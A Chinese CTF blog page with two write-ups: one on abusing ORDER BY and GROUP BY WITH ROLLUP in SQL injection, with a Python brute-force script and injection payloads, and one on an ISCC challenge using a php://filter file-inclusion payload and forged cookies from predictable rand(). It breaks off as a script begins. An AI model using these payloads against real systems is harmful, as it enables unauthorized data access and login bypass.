<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  <title>Iuhrey的幻想乡</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta name="description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:type" content="website">
<meta property="og:title" content="Iuhrey的幻想乡">
<meta property="og:url" content="http://yoursite.com/page/2/index.html">
<meta property="og:site_name" content="Iuhrey的幻想乡">
<meta property="og:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
<meta property="og:locale" content="zh-CN">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="Iuhrey的幻想乡">
<meta name="twitter:description" content="一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手">
  
    <link rel="alternate" href="/atom.xml" title="Iuhrey的幻想乡" type="application/atom+xml">
  
  
    <link rel="icon" href="source/images/favicon.ico" />
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
  <link rel="stylesheet" href="/plugin/bganimation/bg.css">
  

</head>

<body>
  <div id="container">
    <div id="wrap">
      <div class="outer">
        <div class="widget-wrap mobile-header">
  <h3 class="widget-title"></h3>
  <div class="widget">
    <img class="avatar" src="/images/avatar.jpg">
    <h2 class="author">Iuhrey</h2>
    <h3 class="description">一个常年被吊打的Web手    一个唱歌不好指弹垃圾的吉他手</h3>
    <div class="count-box">
      <a href="/archives"><div><strong>24</strong><br>文章</div></a>
      <a href="/categories"><div><strong>2</strong><br>分类</div></a>
      <a href="/tags"><div><strong>12</strong><br>标签</div></a>
    </div>
    <ul class="blog-link">
     
          <a href="/" title="Home">
            <li>幻想乡的起点</li>
          </a>
        
          <a href="/archives" title="Archives">
            <li>幻想乡图</li>
          </a>
        
          <a href="/categories" title="Categories">
            <li>分岔路</li>
          </a>
        
          <a href="/tags" title="Tags">
            <li>路标</li>
          </a>
        
    </ul>
  </div>
</div>

        <section id="main">
  
    <article id="post-order by和group by在sql注入中的妙用" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/23/order by和group by在sql注入中的妙用/" class="article-date">
  <time class="post-time" datetime="2018-05-23T03:12:12.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">23</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/23/order by和group by在sql注入中的妙用/">order by以及group by在sql注入中的妙用</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近Iscc的注入题目真是让人发疯，为此我找了一些sql注入来练手，发现了这么几道有趣的题目，来记录一下  </p>
<h2 id="order-by"><a href="#order-by" class="headerlink" title="order by"></a>order by</h2><p>总所周知，在sql注入中，我们一般使用<strong>order by</strong>来确定列数，这样有助于我们使用联合查询来查询我们所要的数据，为何可以查询出我们所要的数据呢？因为order by是一个排序的函数，order by x的意思是对x列的数据进行ascii码的排序，如果这一列不存在，那么就会报错，所以可以达到确定列数的作用。例子就借鉴大手子的吧。<br><img src="https://upload-images.jianshu.io/upload_images/3372127-999e68d5df275dfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""><br><img src="https://upload-images.jianshu.io/upload_images/3372127-e0876d231d209f40.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt=""> </p>
<h3 id="例子如下"><a href="#例子如下" class="headerlink" title="例子如下"></a>例子如下</h3><p>扫出有源码，如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $dbhost = &quot;localhost&quot;;</span><br><span class="line">  $dbuser = &quot;root&quot;;</span><br><span class="line">  $dbpass = &quot;123456&quot;;</span><br><span class="line">  $db = &quot;ctf&quot;;</span><br><span class="line">  $conn = mysqli_connect($dbhost,$dbuser,$dbpass,$db);</span><br><span class="line">  mysqli_set_charset($conn,&quot;utf8&quot;);</span><br><span class="line"> </span><br><span class="line">  /* sql</span><br><span class="line"> </span><br><span class="line">     create  table `admin` (</span><br><span class="line">        `id` int(10) not null primary key auto_increment,</span><br><span class="line">        `username` varchar(20) not null ,</span><br><span class="line">        `password` varchar(32) not null</span><br><span class="line">     );</span><br><span class="line">  */</span><br><span class="line">function   filter($str)&#123;</span><br><span class="line">      $filterlist = &quot;/\(|\)|username|password|where|</span><br><span class="line">      case|when|like|regexp|into|limit|=|for|;/&quot;;</span><br><span class="line">      if(preg_match($filterlist,strtolower($str)))&#123;</span><br><span class="line">        die(&quot;illegal input!&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">      return $str;</span><br><span class="line">  &#125;</span><br><span class="line">$username = isset($_POST[&apos;username&apos;])?</span><br><span class="line">filter($_POST[&apos;username&apos;]):die(&quot;please input username!&quot;);</span><br><span class="line">$password = isset($_POST[&apos;password&apos;])?</span><br><span class="line">filter($_POST[&apos;password&apos;]):die(&quot;please input password!&quot;);</span><br><span class="line">$sql = &quot;select * from admin where  username =</span><br><span class="line"> &apos;$username&apos; and password = &apos;$password&apos; &quot;;</span><br><span class="line"> </span><br><span class="line">$res = $conn -&gt; query($sql);</span><br><span class="line">if($res-&gt;num_rows&gt;0)&#123;</span><br><span class="line">  $row = $res -&gt; fetch_assoc();</span><br><span class="line">  if($row[&apos;id&apos;])&#123;</span><br><span class="line">     echo $row[&apos;username&apos;];</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">   echo &quot;The content in the password column is the flag!&quot;;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>从源码可以得出，在这个<strong>admin</strong>表中有三列。其次呢，发现这题目过滤了<strong>password，username，=</strong>等等，然后就是回显的要求了，要求我们输入的数据在数据库里面存在，然后通过id给我们返回username，但是我们所要的flag在password里面，这里就需要我们用一些特殊的方法来把password提取出来，由于回显，我们考虑一下布尔型注入，发现<strong>（）</strong>被ban了，所以这一条路是走不通了，不过仔细观察发现，我们除了<strong>union select</strong>还可以利用’以及order by等函数。结合回显是通过id来查询，所以我们可以使用order by进行排序然后通过不同输出判断密码值。我们可以试试。<br>首先通过构造<strong>‘ or 1#</strong>查查原来的username。<br><img src="/images/13/1.png" alt=""><br>再查询一下回显位。<br><img src="/images/13/2.png" alt=""><br>接着按照我们的思路来试试。<br><img src="/images/13/3.png" alt=""><br><img src="/images/13/4.png" alt=""><br>测试完了接下来就可以使用爆破来出flag了。脚本如下。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">#coding=utf-8</span><br><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line">url = &quot;http://202.98.28.108:10801/47g256f48gff/&quot;</span><br><span class="line">l = &quot;0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ_abcdefghijklmnopqrstuvwxyz&#123;&#125;&quot;</span><br><span class="line">number = len(l)</span><br><span class="line">password = list()</span><br><span class="line">flag = 0</span><br><span class="line">ps = &quot;&quot;</span><br><span class="line">for i in range(0,32):#32位</span><br><span class="line">    for j in range(0,number):</span><br><span class="line">        p = &quot;&quot;</span><br><span class="line">        password.append(l[j])</span><br><span class="line">        p = p.join(password)</span><br><span class="line">        r = requests.post(url,data=&#123;&quot;username&quot;:&quot;whaleadmin&apos; union select 1,2,&apos;%s&apos; order by 3#&quot;%(p),&quot;password&quot;:&quot;1&quot;&#125;)</span><br><span class="line">        if &quot;whaleadmin&quot; in r.content:</span><br><span class="line">            if j == 0:</span><br><span class="line">                flag = 1</span><br><span class="line">                break</span><br><span class="line">            else:</span><br><span class="line">                password.pop(len(password) - 1)</span><br><span class="line">                password.append(l[j - 1])</span><br><span class="line">                break</span><br><span class="line">        else:</span><br><span class="line">            password.pop(len(password) - 1)</span><br><span class="line">    if flag == 1:</span><br><span class="line">        break</span><br><span class="line">    print password</span><br><span class="line">print ps.join(password)#输出的密码最后一位需要后移一位</span><br></pre></td></tr></table></figure></p>
<p>爆破出密码之后md5解密一下flag就出来了。</p>
<h2 id="group-by以及with-rollup"><a href="#group-by以及with-rollup" class="headerlink" title="group by以及with rollup"></a>group by以及with rollup</h2><p>group by顾名思义就是把不同数据总和起来，然后进行排序输出。具体的例子可以去这里看看<strong><a href="https://www.cnblogs.com/jingfengling/p/5962182.html" target="_blank" rel="noopener">https://www.cnblogs.com/jingfengling/p/5962182.html</a></strong>，我这里就不多阐述了。<br>字句<strong>with rollup</strong>，求平均值的字句用法也不多说，参考<strong><a href="https://blog.csdn.net/id19870510/article/details/6254358" target="_blank" rel="noopener">https://blog.csdn.net/id19870510/article/details/6254358</a></strong></p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>题目地址:<a href="http://ctf5.shiyanbar.com/web/pcat/index.php" target="_blank" rel="noopener">http://ctf5.shiyanbar.com/web/pcat/index.php</a> ，这是实验吧的一道题目。<br>首先f12有个提示，访问/source.txt得到源码。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line"></span><br><span class="line">if (!isset($_POST[&apos;uname&apos;]) || !isset($_POST[&apos;pwd&apos;])) &#123;</span><br><span class="line">	echo &apos;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;input type=&quot;submit&quot; /&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;/form&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">	echo &apos;&lt;!--source: source.txt--&gt;&apos;.&quot;&lt;br/&gt;&quot;;</span><br><span class="line">    die;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function AttackFilter($StrKey,$StrValue,$ArrReq)&#123;  </span><br><span class="line">    if (is_array($StrValue))&#123;</span><br><span class="line">        $StrValue=implode($StrValue);</span><br><span class="line">    &#125;</span><br><span class="line">    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1)&#123;   </span><br><span class="line">        print &quot;水可载舟，亦可赛艇！&quot;;</span><br><span class="line">        exit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;</span><br><span class="line">foreach($_POST as $key=&gt;$value)&#123; </span><br><span class="line">    AttackFilter($key,$value,$filter);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$con = mysql_connect(&quot;XXXXXX&quot;,&quot;XXXXXX&quot;,&quot;XXXXXX&quot;);</span><br><span class="line">if (!$con)&#123;</span><br><span class="line">	die(&apos;Could not connect: &apos; . mysql_error());</span><br><span class="line">&#125;</span><br><span class="line">$db=&quot;XXXXXX&quot;;</span><br><span class="line">mysql_select_db($db, $con);</span><br><span class="line">$sql=&quot;SELECT * FROM interest WHERE uname = &apos;&#123;$_POST[&apos;uname&apos;]&#125;&apos;&quot;;</span><br><span class="line">$query = mysql_query($sql); </span><br><span class="line">if (mysql_num_rows($query) == 1) &#123; </span><br><span class="line">    $key = mysql_fetch_array($query);</span><br><span class="line">    if($key[&apos;pwd&apos;] == $_POST[&apos;pwd&apos;]) &#123;</span><br><span class="line">        print &quot;CTF&#123;XXXXXX&#125;&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        print &quot;亦可赛艇！&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">	print &quot;一颗赛艇！&quot;;</span><br><span class="line">&#125;</span><br><span class="line">mysql_close($con);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
<p>源码审计，发现题目过滤了很多东西，起码联合查询，延时注入，盲注都不太现实，但是这里依旧没有过滤select，接着看得到flag的要求。<br>首先我们输入一个用户名，网页通过查询数据库得到该用户名的密码，再把该用户名的密码与我们所输入的进行匹配，如果成功，那么flag就到手了。<br>那么问题来了，我们根本不知道用户名，也不知道其密码是什么，如何达到匹配的效果呢？这里group by就派上了用场。注意这个<strong>$key</strong>是查询结果的赋值，我们在一定前提下是可以控制返回的数据的，根据gourp by的用法，我们可以构造一个语句使得查询的密码经过处理后为空，然后输入的密码也为空以此匹配。<br>构造<strong>‘ or 1 group by pwd with rollup limit 1 offset 0,1,2…….#</strong>偏移值一个一个试过去，毕竟不知道那个是有效值，经过尝试最终试出flag的偏移值为2。</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>sql注入中的基操还是太多了，学不完学不完…….不过还是该学的得学，紧跟着大佬的步伐。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://yoursite.com/2018/05/23/order by和group by在sql注入中的妙用/" data-id="cjn3ccggd000vbkvejup8cklx" class="article-share-link">分享</a>
      
      
  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/sql注入/">sql注入</a></li></ul>

    </footer>
  </div>
  
</article>




  
    <article id="post-入侵后台的一次尝试" class="wow slideInRight article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/05/17/入侵后台的一次尝试/" class="article-date">
  <time class="post-time" datetime="2018-05-17T06:18:27.000Z" itemprop="datePublished">
    <span class="post-month">5月</span><br/>
    <span class="post-day">17</span>
  </time>
</a>
   
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/05/17/入侵后台的一次尝试/">入侵后台的一次尝试</a>
    </h1>
  

        <div>
          
          
              

          
        </div>
      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h2><p>最近的ISCC放出了一道web400的题目，里面的代码审计真的是令人头疼，所以为了做出这道题目，我又跑去塔主那里学习了一波(其实之前打卡太懒了，没有认真去学习东西)。   </p>
<h2 id="一次看了解析的入侵后台的操作"><a href="#一次看了解析的入侵后台的操作" class="headerlink" title="一次看了解析的入侵后台的操作"></a>一次看了解析的入侵后台的操作</h2><p>先贴上网址吧。<a href="http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login" target="_blank" rel="noopener">http://202.98.28.108:10013/7sghfe673jd3/index.php?action=front&amp;mode=login</a>  </p>
<h3 id="初步判断"><a href="#初步判断" class="headerlink" title="初步判断"></a>初步判断</h3><p><img src="/images/12/1.png" alt=""><br>打开网站，发现可以攻击的点有很多，比如我们可以在登入框尝试sql注入攻击或者sql约束攻击，也可以尝试去进行xss和CSRF攻击，不过这只是一道CTF题目，管理员不太可能会从登入框登入，所以CSRF攻击可以考虑先放一边。<br><img src="/images/12/2.png" alt=""><br>这里是值得注意的一个点，当我们看到形如这种<strong>?action=front&amp;mode=login</strong>是可以去考虑文件包含漏洞的，一般看到这种，就可以大胆猜测后台是通过<strong>file=$action.’/‘.$mode.’.php’</strong>这种类型的代码来读取文件的。  </p>
<h3 id="进一步探索"><a href="#进一步探索" class="headerlink" title="进一步探索"></a>进一步探索</h3><p>之前都是考虑的一些点，不过还是先按照作者的思路走，既然有一个注册账号的界面，那我们先注册登入看看。<br><img src="/images/12/3.png" alt=""><br>登入进去发现了一条笔记，笔记内容大致是说只有管理员才可以删除笔记，末尾还有一个hint，我们打开这个<strong>./dbinit.sql</strong>，发现弹出一个下载界面，既然是提示，那就下下来看下吧。<br><img src="/images/12/4.png" alt=""><br>这里提供了一个很有用的信息就是数据库里面有一个flag表，我们从里面应该就能得到我们所要的flag了，所以这里肯定会涉及到sql注入的地方，不过，在哪里注入是一个未知的问题。<br>随后我还点了点新建笔记，删除笔记的时候提示我只能是admin才能操作。  </p>
<h3 id="LEF漏洞读取文件"><a href="#LEF漏洞读取文件" class="headerlink" title="LEF漏洞读取文件"></a>LEF漏洞读取文件</h3><p>没啥可以利用的东西了，我们可以试试之前考虑过的文件包含漏洞，构造</p>
<blockquote>
<p>?action=php://filter/read=convert.base64-encode/resource=./&amp;mode=index  </p>
</blockquote>
<p>成功读取了文件，base64解码得到了index.php的内容。接下来就好办多了，把已知文件名的内容全部读取出来。用扫描器扫了扫，发现了其他的一些文件。<br><img src="/images/12/5.png" alt=""><br>全部把源码读取出来  </p>
<h3 id="源码审计"><a href="#源码审计" class="headerlink" title="源码审计"></a>源码审计</h3><p>先来总结一下我们所得到的几个文件的源码:<br>index.php<br>common.php<br>admin/login.php<br>admin/index.php<br>还有一些其他的源码不太重要我就不列举了。<br>首先看看index.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function d_addslashes($array)&#123;</span><br><span class="line"></span><br><span class="line">    foreach($array as $key=&gt;$value)&#123;</span><br><span class="line">        if(!is_array($value))&#123;</span><br><span class="line">              !get_magic_quotes_gpc()&amp;&amp;$value=addslashes($value);</span><br><span class="line">              $array[$key]=$value;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line"></span><br><span class="line">          $array[$key] = d_addslashes($array[$key]);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return $array;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$_POST=d_addslashes($_POST);</span><br><span class="line">$_GET=d_addslashes($_GET);</span><br></pre></td></tr></table></figure></p>
<p>可以看到这里使用了转义’来防止我们使用sql注入，那这样一般来说sql注入是行不通的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">include_once(&apos;common.php&apos;);</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&apos;action&apos;])||!isset($_GET[&apos;mode&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    header(&quot;Location: ./index.php?action=front&amp;mode=login&quot;);</span><br><span class="line"></span><br><span class="line">&#125;elseif(!preg_match(&apos;/\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;]))&#123;</span><br><span class="line">    $action=$_GET[&apos;action&apos;];</span><br><span class="line">    $mode=$_GET[&apos;mode&apos;];</span><br><span class="line">    $file=$action.&apos;/&apos;.$mode.&apos;.php&apos;;</span><br><span class="line">    </span><br><span class="line">    // echo $file;</span><br><span class="line"></span><br><span class="line">&#125;else&#123;</span><br><span class="line"></span><br><span class="line">    die(&quot;Invalid Request!&quot;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>和我们之前猜想的一致，动态链接果然是通过<strong>$file=$action.’/‘.$mode.’.php’;</strong>来读取我们所要的文件的。此后遇到这种情况一般都可以这样考虑，不过有些题目如果过滤了，那再去考虑如何绕过过滤。<br>index.php应该是没有什么可值得审计的了，接下来该审计的地方就是admin/login.php这个点了,common.php里面的配置我们在需要的时候再去看。<br>这是admin/login.php的一些主要内容<br><img src="/images/12/6.png" alt=""><br>简单分析以下就是，首先判断用户输入的用户名和密码是否有效，这里用到了CSRFTOKEN来判断，然后再去数据库中查询我们所输入的用户名和密码是否正确，其实这里是可以尝试注入攻击的，但是我们所要的数据不在这里，所以也没有攻击的必要。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">function set_login($uname,$id,$level)&#123;</span><br><span class="line">     $_SESSION[&apos;userid&apos;]=$id;</span><br><span class="line">     $_SESSION[&apos;level&apos;]=$level;</span><br><span class="line">     </span><br><span class="line">     $endata=encode($uname);</span><br><span class="line">     setcookie(&quot;uid&quot;,&quot;$uname|$endata&quot;);</span><br><span class="line">     </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>这是set_login函数，它把id和level赋给了两个session中的值，然后值得注意的是它把<strong>uname|</strong>和encode加密后的uname拼接在了一起作为uid，并且把它设为了cookies，可以看到这里虽然进行了登入验证，但是它在跳转到admin/index.php的时候，身份验证是通过cookies来验证的，所以这里我们可以通过构造cookies来绕过admin/login.php直接登入admin/index.php。<br>接下来看看admin/index.php<br><img src="/images/12/7.png" alt=""><br>看看验证登入的函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function check_login()&#123;</span><br><span class="line"></span><br><span class="line">    $uid=$_COOKIE[&apos;uid&apos;];</span><br><span class="line">    $userinfo=explode(&quot;|&quot;,$uid);</span><br><span class="line"></span><br><span class="line">    if($userinfo[0]&amp;&amp;$userinfo[1]&amp;&amp;$userinfo[1]==encode($userinfo[0]))&#123;</span><br><span class="line">        return $_SESSION[&apos;userid&apos;];</span><br><span class="line"></span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        return FALSE;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>只是把uid还原了而已，所以我们是可以通过构造uid来实现绕过的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">function get_level()&#123;</span><br><span class="line"></span><br><span class="line">    $uid=$_COOKIE[&apos;uid&apos;];</span><br><span class="line">    $userinfo=explode(&quot;|&quot;,$uid);</span><br><span class="line"></span><br><span class="line">    if($userinfo[0]&amp;&amp;$userinfo[1]&amp;&amp;$userinfo[1]==encode($userinfo[0]))&#123;</span><br><span class="line">        </span><br><span class="line">        if($_SESSION[&apos;level&apos;]!==&quot;0&quot;)&#123;</span><br><span class="line"></span><br><span class="line">            return $_SESSION[&apos;level&apos;];</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            return FALSE;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line"></span><br><span class="line">        return FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>level由于一开始我们登入就默认赋值为了1，所以是没必要去构造level的。接下来可以试着去攻击了。  </p>
<h3 id="构造cookies绕过"><a href="#构造cookies绕过" class="headerlink" title="构造cookies绕过"></a>构造cookies绕过</h3><p>先来看看encode是如何加密的。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function rand_str($lenth=16)&#123;</span><br><span class="line">   $rand=[];</span><br><span class="line">   $_str=&quot;wh&quot;;</span><br><span class="line">   while($lenth)&#123;</span><br><span class="line">   $rand[]=$_str[rand(0,strlen($_str)-1)];</span><br><span class="line">   $lenth--;</span><br><span class="line">   &#125;</span><br><span class="line">//    var_dump($rand);     </span><br><span class="line">    return implode($rand);</span><br><span class="line">&#125;    </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(!isset($_SESSION[&apos;SECURITY_KEY&apos;]))&#123;</span><br><span class="line"></span><br><span class="line">    $_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6);</span><br><span class="line"></span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function encode($str)&#123;</span><br><span class="line">    return md5($_SESSION[&apos;SECURITY_KEY&apos;].$str);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>首先是随机生成一个6位的key然后和username经过md5加密，这里有一个难点就是rand()函数随机从h和w取，这一般对我们来说是无法得到key的，但是rand()函数其实是可预测的，它是一个伪随机函数生成器，原理就不多说了。详细参考这篇文章:<a href="http://www.freebuf.com/articles/web/99093.html" target="_blank" rel="noopener">http://www.freebuf.com/articles/web/99093.html</a><br>要预测就必须要有经过rand()函数生成的前33位数据，所以除了一开始的6位，哪里还有呢？<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_SESSION[&apos;CSRF_TOKEN&apos;]))&#123;</span><br><span class="line">    $_SESSION[&apos;CSRF_TOKEN&apos;]=rand_str(16);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>还有TOKEN,所以我们可以通过两次访问来获取共计44位的数据，来预测下一次生成的key。直接贴塔主的脚本吧。不过塔主的脚本只是针对随机取的字符串只存在少数的情况下，通过爆破来实现的。  </p>
<pre><code>import requests
import re
import itertools
import random
